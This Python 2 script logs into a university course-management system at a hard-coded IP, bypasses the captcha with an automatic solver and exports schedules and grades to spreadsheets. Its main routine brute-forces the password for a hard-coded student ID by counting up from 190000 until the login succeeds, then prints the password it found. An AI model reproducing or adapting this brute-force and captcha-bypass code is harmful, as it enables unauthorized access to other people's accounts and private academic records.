#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2017/8/19 16:57
# @Author  : Geda
import re
import urllib2
import urllib
import requests
import cookielib
from bs4 import BeautifulSoup
import  sys
import xlwt
import re

reload(sys)
sys.setdefaultencoding("utf-8")

class get_html(object):
    def __init__(self,post_url,pass_word):
        self.post_url = post_url
        self.pass_word=pass_word
        # cookie自动管理
        cookie = cookielib.CookieJar()
        hand = urllib2.HTTPCookieProcessor(cookie)
        # opener与cookie绑定
        opener = urllib2.build_opener(hand)
        self.opener = opener
        self.n=0
    def login(self):

        #username = raw_input('请输入你的学号> ')
        #password = raw_input('请输入你的密码> ')
        username ='2015006602'
        password=self.pass_word
        #password = '190099'
        img_url = "http://202.207.247.51:8065/validateCodeAction.do"
        picture = self.opener.open(img_url).read()
        local = open('authoncode/image.jpg', 'wb')  # 验证码写入本地proje目录下验证码
        local.write(picture)  # 显示验证码
        local.close()
        import getcode
        #code = raw_input('请输入验证码> ') # 人工识别验证码e
        code =getcode.getcode()

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            #'Content-Length': '35',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': '202.207.247.51:8065',
            'Origin': 'http://202.207.247.51:8065',
            'Referer': 'http://202.207.247.51:8065/',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36',
        }

        postdatas = {
            'zjh': username,
            'mm': password,
            'v_yzm': code,
        }
        data = urllib.urlencode(postdatas)
        request = urllib2.Request(post_url, data, headers)
        try:
            response = self.opener.open(request)
            html = response.read().decode('gbk','ignore').encode('utf-8')
            return html



        except urllib2.HTTPError, e:

            print e.code
    def get_course_html(self):

        post_data = {'actionType': '6'}
        datas = urllib.urlencode(post_data)
        url = 'http://202.207.247.51:8065/xkAction.do?actionType=6'
        rq_body = ''
        req = urllib2.Request(url, rq_body, post_data)
        result = self.opener.open(req).read().decode('gbk').encode('utf-8')
        return result
    def get_grade_html(self):
        post_data = {
            'type':'ln',
            'oper':'fainfo',
            'fajhh':'5365'
        }
        url = 'http://202.207.247.51:8065/gradeLnAllAction.do?type=ln&oper=fainfo&fajhh=5365'
        rq_body = ''
        req = urllib2.Request(url, rq_body, post_data)
        result = self.opener.open(req).read().decode('gbk').encode('utf-8')
        return result
    def teacher_vaule(self):
        self.login()
        url='http://202.207.247.49/jxpgXsAction.do?oper=listWj'

        html = self.opener(urllib2.Request(url)).read()
        print html
def get_schedule(html):
    items = []
    reg = r'<tr bgcolor="#FFFFFF">(.*?)</tr>'
    time_lists = re.findall(reg,html,re.S)
    for time_list in time_lists:
        time_list =time_list
        reg = r'<td width="11%">(.*?)</td>'
        times = re.findall(reg,time_list)
        for time in times:
            time  = time.encode('utf-8')
            items.append(time)
        reg = r'<td>&nbsp;(.*?)</td>'
        kechengs = re.findall(reg,time_list,re.S)
        for kecheng in kechengs:
            kecheng = kecheng.encode('utf-8')

            kecheng=''.join(kecheng.split())
            kecheng=kecheng.replace('&nbsp;', '无')
            kecheng=kecheng.replace('<br>', '')

            items.append(kecheng)
    new_table = 'class schedule.xls'
    wb = xlwt.Workbook(encoding='utf-8')
    ws = wb.add_sheet('test1')
    headDate = ['时间', '星期一', '星期二', '星期三', '星期四', '星期五', '星期六','星期日']
    for colnum in range(0,8):
        ws.write(0,colnum,headDate[colnum],xlwt.easyxf('font: bold on'))
    index = 1
    j=0
    lens = (len(items))
    while j<lens:
        for i in range(0, 8):
            ws.write(index, i, items[j])
            j += 1
        index += 1
    wb.save(new_table)

def get_grade(html,name):
    items = []
    reg = r' <tr class="odd" .*?>(.*?)</tr>'
    crouse_lists = re.findall(reg,html,re.S)
    for course_list in crouse_lists:
        reg = r'<td align="center">(.*?)</td>'
        crouses=re.findall(reg,course_list,re.S)
        for  crouse in crouses:
            crouse = ''.join(crouse.split())
            crouse = crouse.replace('<palign="center">','')
            crouse = crouse.replace('&nbsp;</P>','')

            items.append(crouse)
    new_table = u'%s的成绩.xls'%name
    wb = xlwt.Workbook(encoding='utf-8')
    ws = wb.add_sheet('test1')
    headDate = ['课程号	', '课序号', '课程名', '英文课程名', '学分', '课程属性', '成绩']
    for colnum in range(0, 7):
        ws.write(0, colnum, headDate[colnum], xlwt.easyxf('font: bold on'))
    index = 1
    j = 0
    lens = (len(items))
    while j < lens:
        for i in range(0, 7):
            ws.write(index, i, items[j])
            j += 1
        index += 1
    wb.save(new_table)

if __name__ == '__main__':
    post_url = "http://202.207.247.51:8065/loginAction.do"
    pass_Word=190000
    html = get_html(post_url,pass_Word)

    html1 =html.login()
    reg = r'<td class="errorTop"><strong><font color="#990000">(.*?)</font></strong><br></td>'
    reg = re.findall(reg, html1)
    if reg != []:
        while reg[0] == '你输入的验证码错误，请您重新输入！':
            html1 = html.login()
            reg = r'<td class="errorTop"><strong><font color="#990000">(.*?)</font></strong><br></td>'
            reg = re.findall(reg, html1)
            if reg==[]:
                reg.append('login success')
            html.n += 1
            print "第%s次识别验证码" % html.n
    else:
        print html1

    while reg[0]=='您的密码不正确，请您重新输入！':
        pass_Word+=1
        print '尝试%s登录'%pass_Word
        html = get_html(post_url, pass_Word)
        # print (html.login())
        html1 = html.login()
        reg = r'<td class="errorTop"><strong><font color="#990000">(.*?)</font></strong><br></td>'

        reg = re.findall(reg, html1)

        if reg != []:
            while reg[0] == '你输入的验证码错误，请您重新输入！':
                html1 = html.login()
                reg = r'<td class="errorTop"><strong><font color="#990000">(.*?)</font></strong><br></td>'
                reg = re.findall(reg, html1)
                html.n += 1

                print "第%s次识别验证码" % html.n
                if reg==[]:
                    reg.append('login success')
                html.n += 1
        else:
            reg.append('login success')
            print 'login success'
    print reg[0]

    print 'you pass word %s'%pass_Word
    # html.teacher_vaule()

   




